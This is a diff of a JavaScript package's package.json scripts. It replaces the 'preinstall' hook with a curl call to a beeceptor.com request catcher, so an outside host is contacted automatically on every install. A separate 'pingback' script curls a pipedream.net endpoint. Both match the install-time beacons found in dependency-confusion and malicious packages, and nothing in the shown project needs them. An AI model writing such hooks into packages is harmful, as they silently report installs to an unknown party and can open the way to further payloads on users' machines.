@@ -295,7 +295,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "tsc",
-    "preinstall": "node index.js",
+    "preinstall": "curl https://bes23.free.beeceptor.com",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "node app.ts",
     "coverage": "yarn clean && yarn test --coverage --ci",
